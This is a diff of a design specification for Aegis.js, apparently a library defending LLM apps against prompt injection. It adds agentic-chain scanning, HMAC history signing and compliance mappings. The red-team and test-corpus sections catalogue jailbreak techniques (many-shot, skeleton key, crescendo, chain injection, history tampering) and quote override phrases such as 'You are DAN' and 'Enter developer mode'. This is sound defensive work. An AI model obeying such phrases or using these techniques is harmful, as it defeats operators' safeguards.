+  // safeResult.output is safe to feed back into context
+  context.push(safeResult.output);
+}
+```
+
+**How `guardChainStep()` works:**
+
+1. Quarantines the model output with `source: "tool_output"`
+2. Runs the Input Scanner against the output (detecting injection payloads — T14)
+3. Tracks cumulative risk across steps — even if no single step is flagged, a rising risk trend triggers intervention
+4. Enforces the step budget (configurable via `agentLoop.maxSteps`)
+5. If `privilegeDecay` is enabled, returns a progressively restricted tool set for subsequent steps
+6. Logs each step to the audit trail with `event: "chain_step_scan"`
 
 ---
 
@@ -1394,6 +1786,8 @@ output:
   detectPII: true
   detectCanary: true
   blockOnLeak: true
+  detectInjectionPayloads: true   # Scan output for downstream injection (agentic chains)
+  sanitizeMarkdown: true          # Strip dangerous markdown constructs
   redactPatterns:
     - "\\b\\d{3}-\\d{2}-\\d{4}\\b"                                   # SSN
     - "\\b4\\d{3}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}\\b"       # Visa
@@ -1406,6 +1800,28 @@ dataFlow:
   piiHandling: redact
   noExfiltration: true
 
+# MCP-specific settings
+mcp:
+  paramValidation: true           # Scan outbound MCP tool parameters for injection
+  quarantineToolOutputs: true     # Auto-quarantine MCP tool outputs
+
+# Recovery behavior after kill switch
+recovery:
+  mode: continue                  # continue | reset-last | quarantine-session | terminate-session
+  autoRetry: false                # Retry with bufferMode: full after kill
+  autoRetryMaxAttempts: 1
+
+# Message integrity (client-side history tamper protection)
+messageIntegrity:
+  enabled: false                  # Enable HMAC signing of assistant messages
+  mode: hmac                      # hmac | fingerprint
+
+# Agentic loop settings
+agentLoop:
+  maxSteps: 25                    # Maximum agentic steps before forced termination
+  rescanOutputs: true             # Re-scan model outputs before they re-enter context
+  privilegeDecay: false           # Reduce available tools on successive steps
+
 # Performance
 performance:
   tokenBudget: 1000       # Warn if safety prompts exceed this many tokens
@@ -1417,6 +1833,11 @@ runtime:
   scanTimeout: 50         # Max ms for deterministic scanner (blocks on timeout by default)
   scanTimeoutAction: block  # block | pass-with-flag
   bufferMode: streaming   # streaming (Optimistic Defense) | full (zero-leakage, blocks TTFT)
+
+# Telemetry (anonymous threat intelligence)
+telemetry:
+  enabled: false          # Explicit opt-in required
+  frequency: daily        # daily | hourly
 ```
 
 ### 13.2 Configuration Formats
@@ -1458,6 +1879,17 @@ const results = await redTeam.scan({
     'role_manipulation',
     'tool_abuse',
     'data_exfiltration',
+    'many_shot_jailbreak',
+    'skeleton_key',
+    'adversarial_suffix',
+    'context_flooding',
+    'crescendo_multi_turn',
+    'chain_injection',
+    'language_switching',
+    'history_manipulation',
+    'virtualization',
+    'denial_of_wallet',
+    'mcp_exploitation',
   ],
   iterations: 100,
 });
@@ -1563,7 +1995,35 @@ A script that runs nightly to pull new patterns from:
 - **Promptfoo** Red Team Dataset
 - **OWASP** LLM Top 10
 - **Microsoft PyRIT**
+- **MITRE ATLAS** attack technique catalog
 - Community-submitted patterns (via PRs)
+
+### 15.3.1 Pattern Database Supply Chain Security
+
+The pattern database is a core security component. A compromised sync source could inject patterns that cause false positives (DoS against legitimate users) or whitelist malicious patterns (creating blind spots). This risk is mitigated through:
+
+**Integrity Verification:**
+- All external pattern sources are pinned to specific versions/commits, not `latest`
+- Synced patterns are verified against SHA-256 checksums published by each source
+- The sync script runs in a sandboxed environment and produces a diff for human review before merging
+- The pattern database in the repo is the source of truth; external syncs are proposals, not automatic updates
+
+**Review Process:**
+- Every synced pattern batch generates a PR against the `patterns/` directory
+- A maintainer must review and approve before patterns go live
+- CI runs the benign corpus against the proposed pattern set — if false positives spike, the PR is flagged
+- Automated sanity checks: no pattern should match common English words, no pattern should be excessively broad (e.g., matching >1% of the benign corpus)
+
+**Rollback Mechanism:**
+- The pattern database is versioned with semantic versioning independent of the library version
+- Each pattern file includes a `version` and `lastValidated` timestamp
+- `aegis.configure()` accepts a `patternVersion` pin (e.g., `patternVersion: '2026.02.15'`) to lock to a known-good version
+- If a bad pattern update ships, a new release with the reverted pattern DB is published within 4 hours
+
+**Community Pattern Submissions:**
+- Community-submitted patterns (via PRs to the public repo) go through the same review process as external syncs
+- Contributors must include at least one test case demonstrating the attack the pattern catches
+- Patterns that trigger >0.05% false positive rate on the benign corpus are rejected unless the contributor can demonstrate the pattern catches a critical attack class
 
 ### 15.4 Recognition Tiers
 
@@ -1598,19 +2058,28 @@ Defense layers must not perceptibly impact the user experience.
 | Layer | Target Latency | Notes |
 | :--- | :--- | :--- |
 | Quarantine wrap | <1ms | Pure type wrapping, no processing |
-| Input Scanner (deterministic) | <10ms | Regex + structural analysis |
+| Input Scanner (deterministic) | <10ms | Regex + structural + entropy + many-shot + language |
+| Input Scanner (perplexity) | 20-50ms | Optional, character-level model |
 | Input Scanner (ML classifier) | <200ms | Optional, async |
+| Trajectory analysis | <20ms | Optional, keyword-based (default) |
+| Trajectory analysis (embedding) | <150ms | Optional, embedding-based drift detection |
+| Message integrity check (HMAC) | <2ms per message | SHA-256 verification |
 | Prompt Builder | <5ms | String construction |
 | Policy Check | <2ms | In-memory lookup |
 | Adaptive Sandbox | ~400ms | **Only if triggered** (high risk). Low risk = 0ms. |
 | Stream Monitor overhead | <2ms per chunk | Pass-through, no buffering delay |
+| Markdown sanitization | <1ms per chunk | Regex-based, inline with stream monitor |
 | Action Validation (rules) | <5ms | Deterministic rules |
 | Action Validation (embedding) | <100ms | Requires embedding call |
 | Action Validation (LLM judge) | 500ms-2s | Requires model call |
-| Output Scanner | <10ms | Pattern matching |
+| MCP param validation | <5ms | Applies input scanner patterns to params |
+| Output Scanner | <10ms | Pattern matching + downstream injection detection |
+| Chain step re-scan | <10ms | Input scanner on model output (agentic loops) |
 | Audit Logging | <5ms | Async write |
-| **Total (deterministic, low risk)** | **<40ms** | **The common case** |
-| **Total (high risk, sandbox triggered)** | **~440ms** | Rare, only suspicious inputs |
+| Alerting evaluation | <1ms | In-memory rule matching |
+| **Total (deterministic, low risk)** | **<45ms** | **The common case** |
+| **Total (high risk, sandbox triggered)** | **~450ms** | Rare, only suspicious inputs |
+| **Total (with perplexity + trajectory)** | **<120ms** | If optional features enabled |
 | **Total (with ML features)** | **<300ms** | If ML classifier is enabled |
 
 ### 16.2 Token Budget
@@ -1680,8 +2149,12 @@ Being honest about limitations is critical for trust:
 
 - **Model-level instruction following changes.** If a provider changes how their model handles system prompts, Aegis's prompt structure may need updating.
 - **Zero-day attack patterns.** Novel injection techniques not in the pattern database will bypass the input scanner. That's why defense-in-depth exists — the sandbox, policy engine, and action validator catch what the scanner misses.
+- **Adversarial suffixes with high sophistication.** While entropy analysis catches many GCG-style attacks, a sufficiently sophisticated adversary can craft adversarial sequences with controlled entropy that evade statistical detection. This is an active research area with no definitive solution.
+- **Perfect multi-turn attack detection.** Crescendo attacks can be arbitrarily subtle. A sufficiently patient attacker with many turns can make each individual escalation step imperceptible. Trajectory analysis raises the bar significantly but cannot guarantee detection of all gradual escalation patterns.
 - **Malicious developers.** If the developer using Aegis intentionally misconfigures it or disables protections, Aegis can't help.
 - **Fundamental architecture fix.** Aegis is mitigation, not a cure. Until LLMs have native instruction/data separation at the architecture level, no library can provide 100% protection.
+- **Attacks that exploit model-specific training artifacts.** Different models have different failure modes based on their training data and RLHF process. Aegis's provider-agnostic approach means it cannot optimize defenses for every model's specific quirks. The configurable delimiter strategy (Section 9.3) partially addresses this.
+- **Side-channel information leakage.** An attacker could potentially extract information through carefully crafted yes/no questions, binary search patterns, or by observing differences in response timing/length. Aegis operates at the content layer and does not control model inference behavior.
 
 ### 17.6 Responsible Disclosure
 
@@ -1689,6 +2162,120 @@ Being honest about limitations is critical for trust:
 - Attack patterns included are for testing your own systems only
 - Documentation will include responsible use guidelines
 - Pattern databases will be versioned and auditable
+
+### 17.7 Industry Standards & Compliance Alignment
+
+Aegis is designed to help developers meet the requirements of emerging AI security frameworks. While Aegis alone does not make an application "compliant" (compliance is holistic), it provides concrete technical controls that map to specific requirements in each framework.
+
+#### OWASP Top 10 for LLM Applications (2025)
+
+| OWASP LLM Risk | Aegis Module(s) | Coverage |
+| :--- | :--- | :--- |
+| **LLM01: Prompt Injection** | Input Scanner, Quarantine, Prompt Builder, Sandbox | Primary defense — full pipeline |
+| **LLM02: Insecure Output Handling** | Stream Monitor, Output Scanner, Markdown Sanitizer | Detects and blocks dangerous outputs |
+| **LLM03: Training Data Poisoning** | *(Out of scope — model-level)* | N/A |
+| **LLM04: Model Denial of Service** | Input size limits, Scanner timeout, Self-DoS protection | Prevents resource exhaustion |
+| **LLM05: Supply Chain Vulnerabilities** | Pattern DB integrity verification, Signed releases | Aegis's own supply chain is secured |
+| **LLM06: Sensitive Information Disclosure** | Canary tokens, PII detection, Secret detection | Detects and blocks data exfiltration |
+| **LLM07: Insecure Plugin Design** | Action Validator, Policy Engine, MCP param validation | Validates all tool/plugin calls |
+| **LLM08: Excessive Agency** | Policy Engine (capabilities), Rate limiting, Approval gates | Restricts what the AI can do |
+| **LLM09: Overreliance** | *(Application-level concern)* | Audit log provides transparency |
+| **LLM10: Model Theft** | *(Infrastructure-level concern)* | N/A |
+
+#### MITRE ATLAS (Adversarial Threat Landscape for AI Systems)
+
+MITRE ATLAS is the ATT&CK equivalent for AI systems. Aegis maps to these ATLAS techniques:
+
+| ATLAS Technique | ID | Aegis Mitigation |
+| :--- | :--- | :--- |
+| Prompt Injection | AML.T0051 | Input Scanner + Quarantine + Sandbox |
+| Prompt Injection via RAG | AML.T0051.001 | Quarantine (source: rag_retrieval) + Sandbox |
+| Jailbreak | AML.T0054 | Pattern database + Many-shot detection + Skeleton key patterns |
+| LLM Data Leakage | AML.T0057 | Canary tokens + PII detection + Stream Monitor |
+| Unsafe Output Handling | AML.T0058 | Output Scanner + Markdown sanitization + Downstream injection detection |
+| Excessive Agency Exploitation | AML.T0059 | Policy Engine + Action Validator + Rate limiting |
+
+#### NIST AI Risk Management Framework (AI RMF 1.0)
+
+| NIST AI RMF Function | Aegis Contribution |
+| :--- | :--- |
+| **GOVERN** | Policy Engine provides declarative, auditable security configuration |
+| **MAP** | Threat Model (Section 7) maps known AI risks to Aegis modules |
+| **MEASURE** | Audit Log captures every security decision for measurement and analysis |
+| **MANAGE** | Defense-in-depth pipeline with configurable risk thresholds; Red Team tools for ongoing assessment |
+
+#### ISO 42001 (AI Management System)
+
+Aegis supports ISO 42001 requirements for:
+- **A.6.2.6** (AI system verification and validation) — Red Team Scanner and adversarial test suites
+- **A.6.2.7** (AI system operation and monitoring) — Audit Log and Stream Monitor
+- **A.8.4** (Data quality for AI systems) — Quarantine module ensures data provenance tracking
+- **A.10.3** (AI system security) — Full defense-in-depth pipeline
+
+#### EU AI Act
+
+For AI systems classified as "high-risk" under the EU AI Act:
+- **Article 9** (Risk management) — Aegis's threat model and layered defenses satisfy requirements for ongoing risk identification and mitigation
+- **Article 12** (Record-keeping) — Audit Log provides the required traceability of AI system decisions
+- **Article 14** (Human oversight) — Approval gates in the Action Validator enable human-in-the-loop control
+- **Article 15** (Accuracy, robustness, cybersecurity) — Input/output scanning and adversarial testing address robustness requirements
+
+> **Note:** Compliance mapping is indicative, not exhaustive. Organizations should work with their compliance teams to map Aegis controls to their specific regulatory requirements. A comprehensive compliance guide will be published alongside v0.4.0 (Phase 4).
+
+### 17.8 Client-Side History Integrity
+
+When conversation history is managed client-side (e.g., Vercel AI SDK's `useChat`), the message array sent to the server can be tampered with. An attacker could:
+
+1. **Inject fabricated assistant messages** — Making it appear the model previously agreed to do something it never said
+2. **Modify previous assistant messages** — Altering past responses to establish a false precedent
+3. **Remove safety-related messages** — Deleting assistant messages where the model refused a request
+
+**Mitigations:**
+
+**Message Signing (Recommended for high-security applications):**
+
+```typescript
+import { Aegis } from '@aegis-ai/core';
+
+const aegis = new Aegis({
+  messageIntegrity: {
+    enabled: true,
+    // Aegis signs each assistant message with HMAC-SHA256
+    // using a server-side secret before sending to the client
+    secret: process.env.AEGIS_MESSAGE_SECRET,
+  },
+});
+
+// In your API route:
+const safeMessages = await aegis.guardInput(messages, {
+  verifyAssistantMessages: true,  // Verify HMAC on all assistant messages
+  // If any assistant message fails verification:
+  // - In 'strict' mode: reject the entire request
+  // - In 'warn' mode: strip unverified assistant messages and log
+  onIntegrityFailure: 'strict',   // 'strict' | 'warn'
+});
+```
+
+**How it works:**
+1. When Aegis processes a stream response, it appends an HMAC signature to the message metadata (invisible to the user)
+2. On the next request, `guardInput()` verifies the HMAC of every assistant message in the history
+3. Messages that fail verification are either rejected or stripped, depending on configuration
+4. This prevents all three tampering vectors above without requiring server-side conversation storage
+
+**Lightweight Alternative (Session Fingerprinting):**
+
+For applications where full message signing is too heavy, Aegis can maintain a server-side hash chain of message IDs:
+
+```typescript
+aegis.configure({
+  messageIntegrity: {
+    enabled: true,
+    mode: 'fingerprint',  // Lighter weight than full HMAC
+    // Stores only a rolling hash of message IDs + content hashes
+    // Uses ~100 bytes per message, stored server-side (in-memory or Redis)
+  },
+});
+```
 
 ---
 
@@ -1788,11 +2375,16 @@ aegis/
 
 - [ ] Quarantine module with TypeScript type safety + `unsafeUnwrap()` guardrails + runtime `Proxy` enforcement
 - [ ] Input Scanner with deterministic pattern matching (sync, <10ms) + cross-chunk sliding window
+- [ ] Entropy analysis for adversarial suffix detection (GCG attacks — T12)
+- [ ] Many-shot jailbreaking detection (T11)
+- [ ] Skeleton key pattern detection (T16)
 - [ ] Prompt Builder with sandwich pattern + configurable delimiter strategies + token budget tracking
 - [ ] **Stream Monitor** (`TransformStream`) with canary token + PII detection + sliding window buffer
+- [ ] Downstream injection payload detection in output (T14)
+- [ ] Markdown/HTML sanitization in output stream
 - [ ] Basic Policy Engine with YAML/JSON config
 - [ ] Basic Audit Logging (JSON file transport)
-- [ ] 10+ injection pattern categories
+- [ ] 15+ injection pattern categories (including virtualization, context flooding, skeleton key, many-shot)
 - [ ] Empirical threshold tuning: run adversarial suite + benign corpus, produce ROC curve, set default threshold
 - [ ] Unit tests + adversarial test suite (Layer 1 + Layer 2)
 
@@ -1801,47 +2393,62 @@ aegis/
 - [ ] **Vercel AI SDK integration** via `experimental_transform` + `wrapLanguageModel()` middleware
 - [ ] `guardInput()` with configurable scan strategy (`last-user`, `all-user`, `full-history`)
 - [ ] Adaptive Sandbox logic with native structured outputs (conditional on risk score)
+- [ ] Kill switch recovery modes (`continue`, `reset-last`, `quarantine-session`, `terminate-session`)
+- [ ] Language detection for language-switching attacks (T18)
 - [ ] 3 preset policies (customer support, code assistant, paranoid)
 - [ ] Benign corpus (5,000 queries from sourcing plan) + false positive CI gate (<0.1%)
 - [ ] Next.js example project (chatbot with streaming protection)
 - [ ] Getting Started documentation
 - [ ] npm publish: `@aegis-ai/core`, `@aegis-ai/vercel`
 
-### Phase 2: Action Safety & Ecosystem (Weeks 7-10) — v0.2.0
+### Phase 2: Action Safety & Ecosystem (Weeks 10-13) — v0.2.0
 
 - [ ] Action Validator with rule-based intent alignment
-- [ ] Rate limiting
+- [ ] Rate limiting (including denial-of-wallet detection — T17)
 - [ ] Human-in-the-loop approval gates
-- [ ] LangChain.js adapter
+- [ ] MCP parameter validation and tool output quarantine
+- [ ] Agentic loop protection: `guardChainStep()`, step budget, output re-scanning (T14)
+- [ ] LangChain.js adapter (with chain injection protection)
 - [ ] Express middleware
 - [ ] Anthropic + OpenAI direct provider adapters
 - [ ] Output Scanner (expanded PII detection, secret detection)
-- [ ] Expanded pattern database (encoding bypass, multi-language)
+- [ ] Expanded pattern database (encoding bypass, multi-language, adversarial suffixes)
 - [ ] Template-based fuzzing with `fast-check` in CI
-- [ ] Pattern DB auto-sync script (Promptfoo, OWASP, PyRIT)
+- [ ] Pattern DB auto-sync script with integrity verification (Promptfoo, OWASP, PyRIT, MITRE ATLAS)
 - [ ] MCP server integration guide
 - [ ] npm publish: `@aegis-ai/langchain`, `@aegis-ai/express`, `@aegis-ai/anthropic`, `@aegis-ai/openai`
 
-### Phase 3: Testing & Intelligence (Weeks 11-14) — v0.3.0
+### Phase 3: Testing & Intelligence (Weeks 14-17) — v0.3.0
 
 - [ ] Red Team Scanner with full attack suites
 - [ ] CI/CD test runner (`npx aegis test`)
+- [ ] Conversation trajectory analysis for Crescendo attack detection (T7)
+- [ ] Client-side message integrity (HMAC signing — T15)
+- [ ] Privilege decay for agentic chains
+- [ ] OpenTelemetry integration (spans, metrics, log records)
+- [ ] Alerting engine (rate-based, session-based, cost-based alerts)
 - [ ] SvelteKit middleware
 - [ ] Hono/Fastify middleware
 - [ ] Google/Mistral/Ollama adapters
 - [ ] Embedding-based intent alignment (optional)
+- [ ] Embedding-based trajectory drift detection (optional)
 - [ ] Custom transport for audit logging
 - [ ] Promptfoo compatibility layer
 - [ ] Documentation site (VitePress or Starlight)
 - [ ] npm publish: `@aegis-ai/testing`, `@aegis-ai/cli`, `@aegis-ai/sveltekit`, `@aegis-ai/hono`
 
-### Phase 4: Advanced (Weeks 15-20) — v0.4.0
+### Phase 4: Advanced (Weeks 18-23) — v0.4.0
 
 - [ ] LLM-judge intent alignment (optional)
+- [ ] Perplexity-based input analysis (optional lightweight model)
 - [ ] Multi-modal content scanning (images with text)
-- [ ] Conversation history analysis (multi-turn attack detection)
+- [ ] Advanced conversation history analysis (multi-turn attack detection with ML)
 - [ ] Dashboard UI for audit log visualization
-- [ ] OWASP LLM Top 10 compliance mapping
+- [ ] OWASP LLM Top 10 compliance mapping document
+- [ ] MITRE ATLAS + NIST AI RMF compliance guide
+- [ ] EU AI Act alignment guide
+- [ ] Anonymous threat intelligence telemetry (opt-in)
+- [ ] Auto-retry with elevated security after kill switch
 - [ ] Performance optimization pass
 - [ ] **Boss Battle Alpha** — Tiers 1-5, invite-only
 
@@ -1849,9 +2456,12 @@ aegis/
 
 - [ ] ML-based input classifier (trained on community-submitted attacks)
 - [ ] Vector DB integration for attack pattern recognition
-- [ ] Enterprise features (SSO audit log access, compliance reports)
+- [ ] Enterprise features (SSO audit log access, compliance reports, SOC 2 audit trails)
 - [ ] Formal security audit by third party
 - [ ] OWASP project submission
+- [ ] Cross-deployment threat intelligence dashboard (from anonymous telemetry)
+- [ ] Side-channel attack detection research (response timing/length analysis)
+- [ ] Model-specific defense profiles (optimized patterns per provider/model)
 - [ ] **Boss Battle v1.0** — All 7 tiers, public, seasonal challenges
 
 ---
@@ -1873,9 +2483,13 @@ aegis/
 | Metric | Target |
 | :--- | :--- |
 | Known attack patterns blocked (deterministic) | >95% |
-| Novel attack patterns caught (heuristic) | >60% |
+| Novel attack patterns caught (heuristic + entropy) | >65% |
+| Many-shot jailbreaking detection rate | >90% |
+| Adversarial suffix detection rate (known GCG variants) | >85% |
+| Crescendo attack detection rate (multi-turn) | >70% |
 | False positive rate (balanced mode) | <5% |
 | Benign corpus pass rate | >99.9% |
+| Client-side history tampering detection (with integrity enabled) | 100% |
 | Zero security vulnerabilities in Aegis itself | Ongoing |
 
 ### 20.3 Performance
@@ -1933,6 +2547,16 @@ These need resolution before or during Phase 1:
 
 10. **Fail Open default for sandbox.** Is it correct that when the sandbox model is unreachable, we should default to allowing the request through (with logging)? Or should this be configurable per deployment?
 
+11. **Perplexity model bundling.** The perplexity estimator requires a lightweight language model (~500KB). Should it be bundled in core (increases bundle size but works offline) or distributed as a separate `@aegis-ai/perplexity` package? Edge Runtime compatibility is a concern.
+
+12. **Message integrity storage.** HMAC-based message signing requires the server to verify signatures on subsequent requests. For stateless API routes (common in Next.js), where should the HMAC secret live? Environment variable (simplest), per-session key (more secure), or external store (Redis)?
+
+13. **Agentic loop integration depth.** How tightly should Aegis integrate with LangChain's callback system vs. providing a standalone `guardChainStep()` function? Tight integration = better DX but coupling risk. Standalone = more portable but requires manual wiring.
+
+14. **Telemetry trust model.** If we build anonymous threat intelligence telemetry, how do we prevent a malicious actor from flooding the telemetry endpoint with false data to corrupt the community threat landscape? Rate limiting per API key? Proof-of-work? Reputation-based weighting?
+
+15. **Entropy threshold calibration.** The adversarial suffix entropy detector needs a per-language baseline (entropy varies significantly across languages). Should we ship baseline entropy profiles for major languages, or calculate them dynamically from the conversation?
+
 ---
 
 ## Appendix A: Historical Inspiration
@@ -1981,6 +2605,24 @@ The security patterns Aegis is built on aren't new. Here's where each module dra
 
 **What we borrowed:** The principle of adaptive rigor. Not every request deserves the same level of scrutiny. Aegis calculates a risk score and only triggers expensive defenses (sandbox) when the score warrants it. Low-risk inputs pass through with minimal overhead.
 
+### A.8 HMAC Message Authentication → Client-Side History Integrity
+
+**Origin:** HMAC (RFC 2104, 1997). Hash-based Message Authentication Codes provide a way to verify both the integrity and authenticity of a message. Used throughout TLS, API authentication, and session management.
+
+**What we borrowed:** The same technique used to prevent cookie tampering in web sessions is applied to prevent conversation history tampering. Each assistant message is signed with a server-side secret. On subsequent requests, signatures are verified before the model processes the history. Forged assistant messages (which never originated from the model) are detected and rejected.
+
+### A.9 SIEM & Threat Intelligence → Alerting & Telemetry
+
+**Origin:** Security Information and Event Management (SIEM) systems (ArcSight 2000, Splunk 2003). The principle that individual security events become far more valuable when aggregated, correlated, and analyzed across time and across deployments.
+
+**What we borrowed:** The alerting engine detects patterns across events (rate spikes, repeated kills in a session, cost anomalies) rather than just reacting to individual events. The anonymous telemetry system applies the threat intelligence sharing model from CERTs and ISACs to AI security — aggregated, anonymized data from many deployments reveals attack campaigns invisible to any single operator.
+
+### A.10 Entropy-Based Anomaly Detection → Adversarial Suffix Detection
+
+**Origin:** Shannon entropy (1948) has been used in security for decades — detecting encrypted payloads in network traffic, identifying packed malware, and spotting anomalous DNS queries. The principle: data generated by algorithms has different statistical properties than data generated by humans.
+
+**What we borrowed:** Adversarial suffix attacks (GCG) produce token sequences with measurably higher entropy than natural language. By applying the same entropy analysis used in network security to natural language input, we detect an entire class of algorithmically-generated attacks without needing to match specific patterns.
+
 ---
 
 ## Appendix B: Comprehensive Testing Strategy
@@ -2003,8 +2645,17 @@ A collection of 2,000+ known prompt injections, maintained via the Aegis Protoco
 - **Indirect:** Poisoned HTML, email payloads, PDF metadata
 - **Encoding:** Base64, Rot13, Unicode hacks, invisible characters
 - **Polyglot:** Attacks in German, Russian, Chinese, Arabic
+- **Many-shot:** Long inputs with repeated Q&A patterns designed to override alignment
+- **Skeleton key:** Qualifier-based attacks ("for educational purposes", "hypothetically")
+- **Virtualization:** "Simulate a terminal", "Enter developer mode", "You are DAN"
+- **Adversarial suffixes:** GCG-style high-entropy token sequences (sourced from published research)
+- **Context flooding:** Inputs designed to push system instructions out of attention
+- **Crescendo sequences:** Multi-turn conversations with gradual escalation patterns
+- **Chain injection:** Inputs designed to produce outputs that inject into downstream LLM calls
+- **Language switching:** Mid-message language changes to exploit low-resource language safety gaps
+- **History manipulation:** Fabricated conversation histories with tampered assistant messages
 
-**Execution:** These run against a mock LLM harness. The test passes if the `InputScanner` flags them with a score above threshold.
+**Execution:** These run against a mock LLM harness. The test passes if the `InputScanner` flags them with a score above threshold. Multi-turn tests (Crescendo, history manipulation) run against `guardInput()` with `full-history` scan strategy.
 
 #### Layer 3: Fuzzing (Template-Based)
 We use `fast-check` (Property-Based Testing) instead of expensive LLM API fuzzing for CI.
@@ -2065,4 +2716,4 @@ jobs:
 
 ---
 
-_This document is the authoritative source for Aegis.js v2.1. It supersedes all prior versions (v1.0, v1.1, v2.0)._
+_This document is the authoritative source for Aegis.js v3.0. It supersedes all prior versions (v1.0, v1.1, v2.0, v2.1)._
